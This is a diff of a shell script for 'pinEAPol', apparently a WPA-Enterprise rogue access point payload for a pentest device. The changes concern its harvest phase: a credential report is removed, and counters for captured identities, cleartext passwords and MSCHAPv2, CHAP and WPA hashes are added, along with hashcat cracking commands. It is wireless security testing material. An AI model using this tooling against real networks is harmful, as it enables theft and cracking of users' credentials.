+            status_negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
             LOG blue "--- Status [${uptime}s] ---"
-            LOG blue "Identities: $IDENTITY_COUNT"
-            LOG blue "Cleartext:  $CLEARTEXT_COUNT"
-            LOG blue "MSCHAPv2:   $MSCHAPV2_COUNT"
+            LOG blue "Profile: $EAP_PROFILE | EAP: $status_negotiation"
+            LOG blue "Evidence: cleartext=$CLEARTEXT_COUNT  5500=$MSCHAPV2_COUNT  4800=$CHAP_COUNT  22000=$WPA2_HASH_COUNT"
+            LOG blue "Identities: $IDENTITY_COUNT | TLS evidence: $TLS_EVIDENCE_COUNT | NAKs: $nak_count"
         fi
 
         # Check hostapd still running
@@ -4002,98 +4698,6 @@ $cleartext_record"
 # ============================================
 # PHASE 4: HARVEST
 # ============================================
-
-generate_report() {
-    local dir="$SESSION_RESULTS_DIR"
-    local report="$dir/report.txt"
-    local duration
-    duration=$(cat "$SESSION_DIR/duration.txt" 2>/dev/null || echo "N/A")
-
-    {
-        echo "======================================"
-        echo "  pinEAPol - WPA-Enterprise Engagement Report"
-        echo "======================================"
-        echo ""
-        echo "Date:     $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "Target:   $TARGET_SSID"
-        echo "BSSID:    ${TARGET_BSSID:-N/A}"
-        echo "Channel:  $TARGET_CHANNEL"
-        echo "Duration: $duration"
-        echo "EAP:      $EAP_PROFILE"
-        echo "Cert:     $CERT_PROFILE"
-        echo "Backend:  $HOSTAPD_BACKEND"
-        echo "Hostapd:  $HOSTAPD_BIN"
-        echo ""
-        echo "======================================"
-        echo "  RESULTS"
-        echo "======================================"
-        echo ""
-        echo "EAP Identities:       $IDENTITY_COUNT"
-        echo "Cleartext Passwords:  $CLEARTEXT_COUNT"
-        echo "MSCHAPv2 Hashes:      $MSCHAPV2_COUNT"
-        echo ""
-
-        if [ -f "$dir/identities.txt" ] && [ -s "$dir/identities.txt" ]; then
-            echo "--- CAPTURED IDENTITIES ---"
-            cat "$dir/identities.txt"
-            echo ""
-        fi
-
-        if [ -f "$dir/cleartext_creds.tsv" ] && [ -s "$dir/cleartext_creds.tsv" ]; then
-            echo "--- CLEARTEXT CREDENTIALS ---"
-            cat "$dir/cleartext_creds.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/mana_cleartext_creds.tsv" ] &&
-           [ "$(wc -l < "$dir/mana_cleartext_creds.tsv")" -gt 1 ]; then
-            echo "--- MANA CLEARTEXT CREDENTIALS ---"
-            cat "$dir/mana_cleartext_creds.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/mana_mschapv2.tsv" ] &&
-           [ "$(wc -l < "$dir/mana_mschapv2.tsv")" -gt 1 ]; then
-            echo "--- MANA MSCHAPV2 CAPTURES ---"
-            cat "$dir/mana_mschapv2.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/mana_chap.tsv" ] &&
-           [ "$(wc -l < "$dir/mana_chap.tsv")" -gt 1 ]; then
-            echo "--- MANA CHAP CAPTURES ---"
-            cat "$dir/mana_chap.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/mschapv2_raw.tsv" ] && [ -s "$dir/mschapv2_raw.tsv" ]; then
-            echo "--- MSCHAPv2 RAW FIELDS ---"
-            cat "$dir/mschapv2_raw.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/eap_sessions.tsv" ] && [ -s "$dir/eap_sessions.tsv" ]; then
-            echo "--- EAP SESSION EVENTS ---"
-            cat "$dir/eap_sessions.tsv"
-            echo ""
-        fi
-
-        if [ -f "$dir/hashcat_5500.txt" ] && [ -s "$dir/hashcat_5500.txt" ]; then
-            echo "--- HASHCAT FORMAT (mode 5500) ---"
-            cat "$dir/hashcat_5500.txt"
-            echo ""
-            echo "Crack: hashcat -m 5500 hashcat_5500.txt wordlist.txt"
-            echo ""
-        fi
-
-        echo "--- FILES ---"
-        find "$SESSION_DIR" -maxdepth 3 -type f 2>/dev/null | sort
-        echo ""
-        echo "======================================"
-        echo "  END OF REPORT"
-        echo "======================================"
-    } > "$report"
-}
 
 harvest_results() {
     LOG ""
@@ -4112,6 +4716,7 @@ harvest_results() {
     # Final credential parse
     local sid=$(START_SPINNER "Parsing credentials...")
     parse_credentials "$HOSTAPD_LOG" "$SESSION_RESULTS_DIR"
+    cleanup_stale_parse_staging "$SESSION_WORK_DIR"
     STOP_SPINNER $sid
 
     # Record duration
@@ -4120,9 +4725,6 @@ harvest_results() {
     local dur_min=$((duration / 60))
     local dur_sec=$((duration % 60))
     echo "${dur_min}m ${dur_sec}s" > "$SESSION_DIR/duration.txt"
-
-    # Generate report
-    generate_report
 
     # Display summary
     LOG ""
@@ -4136,6 +4738,9 @@ harvest_results() {
     LOG green "Identities:       $IDENTITY_COUNT"
     LOG green "Cleartext creds:  $CLEARTEXT_COUNT"
     LOG yellow "MSCHAPv2 hashes:  $MSCHAPV2_COUNT"
+    LOG yellow "MD5/CHAP records: $CHAP_COUNT"
+    LOG yellow "WPA hashes:        $WPA2_HASH_COUNT"
+    LOG blue "TLS evidence lines: $TLS_EVIDENCE_COUNT"
     LOG ""
     LOG blue "Loot: $SESSION_DIR"
 
@@ -4145,7 +4750,17 @@ harvest_results() {
         LOG yellow "  hashcat -m 5500 results/hashcat_5500.txt wordlist.txt"
     fi
 
-    local total=$((IDENTITY_COUNT + CLEARTEXT_COUNT + MSCHAPV2_COUNT))
+    if [ -s "$SESSION_RESULTS_DIR/hashcat_4800.txt" ]; then
+        LOG yellow "Crack MD5/CHAP hashes:"
+        LOG yellow "  hashcat -m 4800 results/hashcat_4800.txt wordlist.txt"
+    fi
+
+    if [ -s "$SESSION_RESULTS_DIR/hashcat_22000.txt" ]; then
+        LOG yellow "Crack WPA hashes:"
+        LOG yellow "  hashcat -m 22000 results/hashcat_22000.txt wordlist.txt"
+    fi
+
+    local total=$((IDENTITY_COUNT + CLEARTEXT_COUNT + MSCHAPV2_COUNT + CHAP_COUNT + WPA2_HASH_COUNT + TLS_EVIDENCE_COUNT))
 
     if [ "$total" -gt 0 ]; then
         VIBRATE
@@ -4159,6 +4774,8 @@ harvest_results() {
 Identities: $IDENTITY_COUNT
 Cleartext: $CLEARTEXT_COUNT
 MSCHAPv2: $MSCHAPV2_COUNT
+MD5/CHAP: $CHAP_COUNT
+TLS evidence: $TLS_EVIDENCE_COUNT
 
 Loot saved"
     else
@@ -4201,7 +4818,7 @@ LOG yellow "      \\       /"
 LOG yellow "       '-----'"
 LOG ""
 LOG red "  WPA-Enterprise EAP Capture"
-LOG red "  v3.6"
+LOG red "  v3.7"
 LOG ""
 
 # Confirm start
